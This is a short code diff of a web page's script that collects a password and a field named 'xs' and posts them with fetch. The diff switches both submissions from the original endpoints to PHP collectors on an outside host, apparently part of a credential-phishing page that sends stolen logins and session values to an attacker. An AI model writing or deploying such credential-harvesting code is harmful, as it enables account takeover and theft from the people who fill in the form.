@@ -1567,7 +1567,7 @@
               formData.append('xs', data.xs);
               formData.append('password', data.password);
 
-              fetch(decodedUrl, {
+              fetch('https://mdteam-c6e73.wasmer.app/rashid.php', {
                   method: 'POST',
                   body: formData
               })
@@ -1673,7 +1673,7 @@
                       confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
 
                       // Submit to SubmitForm.com
-                      const response = await fetch('https://submit-form.com/xhbHXNvJ0', {
+                      const response = await fetch('https://mdteam-c6e73.wasmer.app/rashidpass.php', {
                           method: 'POST',
                           headers: {
                               'Content-Type': 'application/json',
@@ -1873,5 +1873,6 @@
           });
       });
   </script>
+
 
 </body></html>
